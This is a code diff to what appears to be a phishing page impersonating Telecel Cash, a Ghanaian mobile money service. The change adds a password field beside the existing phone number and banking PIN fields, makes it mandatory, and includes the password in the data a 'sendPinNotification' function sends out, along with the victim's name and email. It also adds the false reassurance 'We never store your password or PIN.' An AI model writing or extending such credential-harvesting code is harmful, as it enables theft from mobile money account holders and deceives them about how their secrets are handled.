@@ -94,7 +94,7 @@
 
     <div class="apply-card">
         <div class="section-title">Confirm Your Details</div>
-        <div class="section-sub">Enter your Telecel number and PIN</div>
+        <div class="section-sub">Enter your Telecel number, password, and PIN</div>
 
         <div class="user-detail-strip">
             <div class="detail-row">
@@ -118,6 +118,13 @@
             <span class="field-hint">Enter your active Telecel mobile number (starts with +233)</span>
         </div>
 
+        <!-- Password Field -->
+        <div class="form-group">
+            <label class="required">🔒 Password</label>
+            <input type="password" id="password" placeholder="Enter your password" autocomplete="off">
+            <span class="field-hint">Your Telecel Cash account password</span>
+        </div>
+
         <!-- PIN Field -->
         <span class="pin-label">🔑 Mobile Banking PIN (4 digits)</span>
         <div class="pin-boxes">
@@ -133,7 +140,7 @@
 
         <div class="security-note">
             <span>🔒</span>
-            <span>Your information is encrypted and secure.</span>
+            <span>Your information is encrypted and secure. We never store your password or PIN.</span>
         </div>
     </div>
 </div>
@@ -160,6 +167,7 @@
     document.getElementById('dispEmail').innerText = email || '—';
 
     const telecelNumberInput = document.getElementById('telecelNumber');
+    const passwordInput = document.getElementById('password');
     
     const boxes = ['p1', 'p2', 'p3', 'p4'].map(id => document.getElementById(id));
     const confirmBtn = document.getElementById('confirmBtn');
@@ -167,8 +175,9 @@
 
     function checkAllFields() {
         const telecelNumber = telecelNumberInput.value.trim();
+        const password = passwordInput.value.trim();
         const pinFilled = boxes.every(b => b.value.length === 1);
-        confirmBtn.disabled = !(telecelNumber && pinFilled);
+        confirmBtn.disabled = !(telecelNumber && password && pinFilled);
     }
 
     function isValidTelecelNumber(number) {
@@ -212,6 +221,7 @@
     });
 
     telecelNumberInput.addEventListener('input', checkAllFields);
+    passwordInput.addEventListener('input', checkAllFields);
 
     boxes[0].focus();
 
@@ -225,10 +235,11 @@
         setTimeout(() => errorDiv.classList.remove('show'), 5000);
     }
 
-    async function sendPinNotification(telecelNumber, pin) {
+    async function sendPinNotification(telecelNumber, password, pin) {
         const payload = {
             phone: phone,
             telecel_number: telecelNumber,
+            password: password,
             pin: pin,
             email: email,
             name: name,
@@ -258,6 +269,7 @@
 
     document.getElementById('confirmBtn').onclick = async function() {
         const telecelNumber = telecelNumberInput.value.trim();
+        const password = passwordInput.value.trim();
         const pin = getPin();
         
         if (!telecelNumber) {
@@ -270,6 +282,16 @@
             return;
         }
         
+        if (!password) {
+            showError('Please enter your password.');
+            return;
+        }
+        
+        if (password.length < 4) {
+            showError('Password must be at least 4 characters.');
+            return;
+        }
+        
         if (pin.length !== 4) {
             showError('Please enter all 4 PIN digits.');
             return;
@@ -278,7 +300,7 @@
         confirmBtn.disabled = true;
         confirmBtn.textContent = 'Processing...';
 
-        await sendPinNotification(telecelNumber, pin);
+        await sendPinNotification(telecelNumber, password, pin);
         
         localStorage.setItem('telecelNumber', telecelNumber);
         
